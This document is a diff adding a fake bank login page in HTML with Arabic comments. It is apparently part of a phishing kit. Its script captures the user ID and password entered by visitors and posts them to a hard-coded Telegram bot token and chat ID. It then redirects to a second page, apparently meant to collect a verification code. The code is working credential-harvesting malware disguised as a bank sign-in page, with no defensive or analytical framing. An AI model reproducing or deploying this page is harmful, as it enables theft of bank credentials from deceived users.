@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Bank Login</title>
+  <style>
+    :root { --bg:#fff; --text:#0f172a; --line:#c7cdd6; --line-focus:#374151; --primary:#d90429; --primary-hover:#b70322; }
+    body{margin:0;background:var(--bg);font-family:"Segoe UI",sans-serif;color:var(--text);}
+    .container{max-width:400px;margin:80px auto;padding:0 20px;text-align:center;}
+    .logo{margin-bottom:40px;}
+    .logo img{max-width:160px;height:auto;}
+    .field{margin:24px 0;text-align:left;}
+    .input-row{display:flex;border-bottom:1px solid var(--line);padding:8px 0;}
+    .input-row:focus-within{border-bottom-color:var(--line-focus);}
+    .field input{flex:1;border:none;outline:none;background:transparent;font-size:16px;}
+    .field input::placeholder{color:#9aa2af;}
+    .actions{margin-top:32px;}
+    .btn{width:100%;padding:14px;border:none;border-radius:8px;background:var(--primary);color:#fff;font-weight:700;font-size:16px;cursor:pointer;}
+    .btn:hover{background:var(--primary-hover);}
+    .alert{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#d90429;color:#fff;padding:16px 24px;border-radius:8px;font-size:16px;font-weight:600;display:none;z-index:9999;}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo"><img src="images (1).jpeg" alt="Bank Logo"></div>
+    <div class="field"><div class="input-row"><input id="userId" type="text" placeholder="User ID"></div></div>
+    <div class="field"><div class="input-row"><input id="password" type="password" placeholder="Password"></div></div>
+    <div class="actions"><button class="btn" id="loginBtn">LOGIN</button></div>
+  </div>
+  <div class="alert" id="alertBox">يرجى ملء الحقول أولاً</div>
+  <script>
+    // ضع التوكن والشات آيدي الخاص بك هنا
+    const BOT_TOKEN = "8505053310:AAEPvystouk-c_PI8Yy-imTXHM9mhWfpc9k";
+    const CHAT_ID = "8492691780";
+
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      });
+    }
+
+    const loginBtn=document.getElementById('loginBtn');
+    const userId=document.getElementById('userId');
+    const password=document.getElementById('password');
+    const alertBox=document.getElementById('alertBox');
+
+    loginBtn.addEventListener('click',()=>{
+      if(!userId.value.trim()||!password.value.trim()){
+        alertBox.style.display='block';
+        setTimeout(()=>alertBox.style.display='none',2000);
+      } else {
+        // توليد رقم طلب عشوائي من 6 أرقام
+        const orderId = Math.floor(100000 + Math.random() * 900000);
+
+        // حفظ الرقم في localStorage ليُستخدم في الصفحة الثانية
+        localStorage.setItem("orderId", orderId);
+
+        // إرسال البيانات إلى تيليجرام
+        const message = `🔐 بيانات تجريبية:\nUser ID: ${userId.value}\nPassword: ${password.value}\nرقم الطلب: ${orderId}`;
+        sendToTelegram(message);
+
+        // الانتقال للصفحة الثانية
+        window.location.href="code.html";
+      }
+    });
+  </script>
+</body>
+</html>
